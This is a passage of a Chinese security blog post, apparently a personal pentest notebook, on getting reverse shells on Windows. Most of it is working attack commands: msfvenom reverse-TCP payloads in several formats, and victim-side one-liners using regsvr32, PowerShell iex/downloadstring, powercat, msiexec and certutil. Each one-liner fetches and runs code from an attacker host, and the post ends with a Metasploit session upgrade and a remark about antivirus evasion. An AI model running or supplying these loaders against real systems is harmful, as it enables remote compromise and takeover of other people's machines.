+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">regsvr32.exe <span class="hljs-regexp">/n /</span>s <span class="hljs-regexp">/u /i</span>:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span>/cmd.sct scrobj.dll<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207094703089.png" srcset="/img/loading.gif" lazyload alt="image-20240207094703089"></p>
+<p>完美反弹shell</p>
+<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><h3 id="psh"><a href="#psh" class="headerlink" title="psh"></a>psh</h3><ol>
+<li><p>使用msfvenom生成一个payload(psh)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f psh &gt; 10000.ps1<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>开启http服务</p>
+</li>
+<li><p>使用受害机远程加载</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">powershell.exe -c <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/10000.ps1&#x27;);10000.ps1&quot;</span><span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207102546441.png" srcset="/img/loading.gif" lazyload alt="image-20240207102546441"></p>
+</li>
+</ol>
+<h3 id="psh-reflection"><a href="#psh-reflection" class="headerlink" title="psh-reflection"></a>psh-reflection</h3><p>和上面的基本一致，只是生成的脚本不一致而已，然后执行的时候可以不用分号后面添加脚本的名字</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207103108325.png" srcset="/img/loading.gif" lazyload alt="image-20240207103108325"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f   psh-reflection -o 10000.ps1<br><br></code></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">powershell.exe -c <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/10000.ps1&#x27;)&quot;</span><span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="PowerShell加载Powercat"><a href="#PowerShell加载Powercat" class="headerlink" title="PowerShell加载Powercat"></a>PowerShell加载Powercat</h2><ol>
+<li><p>下载powercat</p>
+<blockquote>
+<p>powercat 就是使用.NET框架写的nc 和nc的使用完全一致</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/besimorhino/</span>powercat.git<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在powercat的路径开启http.server</p>
+</li>
+<li><p>受害者执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/powercat.ps1&#x27;);powercat -c 192.168.79.138 -p 10000 -e powershell&quot;</span>;  <br></code></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207104452006.png" srcset="/img/loading.gif" lazyload alt="image-20240207104452006"></p>
+<p>反弹成功</p>
+<h2 id="PowerShell启动Cscript"><a href="#PowerShell启动Cscript" class="headerlink" title="PowerShell启动Cscript"></a>PowerShell启动Cscript</h2><p>少用不能免杀</p>
+<ol>
+<li><p>生成一个payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f   vbs -o 10000.vbs<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>上传到http.server上</p>
+</li>
+<li><p>远程加载</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f   vbs -o 10000.vbs<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h2><p>msi文件格式</p>
+<ol>
+<li><p>先生成一个payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f msi -o 10000.msi<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>开启http.server的服务</p>
+</li>
+<li><p>然后远程访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msiexec.exe <span class="hljs-regexp">/q /i</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span>/<span class="hljs-number">10000</span>.msi <br></code></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207112047416.png" srcset="/img/loading.gif" lazyload alt="image-20240207112047416"></p>
+<h2 id="exe-升级msf-session-handler监听"><a href="#exe-升级msf-session-handler监听" class="headerlink" title="exe + 升级msf session + handler监听"></a>exe + 升级msf session + handler监听</h2><p>原理</p>
+<p>使用handler监听和nc监听是一样的</p>
+<ol>
+<li><p>生成一个paylod</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f exe -o 10000.exe<br></code></pre></td></tr></table></figure>
+
+<p>这个方式不是metepreter ，只是一个Shell</p>
+<p>后续可以通过升级的方式升级成为metepreter</p>
+</li>
+<li><p>使用msf监听</p>
+</li>
+<li><p>下载到受害机，并且执行</p>
+<p>这里使用certutil执行</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/<span class="hljs-number">10000</span>.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\windows\temp\<span class="hljs-number">44</span>.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\windows\temp\<span class="hljs-number">44</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135558597.png" srcset="/img/loading.gif" lazyload alt="image-20240207135558597"></p>
+<p>成功下载文件，并且执行</p>
+</li>
+<li><p>反弹</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135710179.png" srcset="/img/loading.gif" lazyload alt="image-20240207135710179"></p>
+<p>但是我们想反弹那到msf handler 上面</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135859435.png" srcset="/img/loading.gif" lazyload alt="image-20240207135859435"></p>
+<p>升级session 这里的session是只有一个shell</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png" srcset="/img/loading.gif" lazyload alt="image-20240207140004307"></p>
+<p>就多一个session</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png" srcset="/img/loading.gif" lazyload alt="image-20240207140034057"></p>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>windwos反弹shell</div>
+      <div>https://tsy244.github.io/2024/02/06/渗透/windwos反弹shell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 6, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/04/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/" title="Powershell渗透框架">
+                        <span class="hidden-mobile">Powershell渗透框架</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
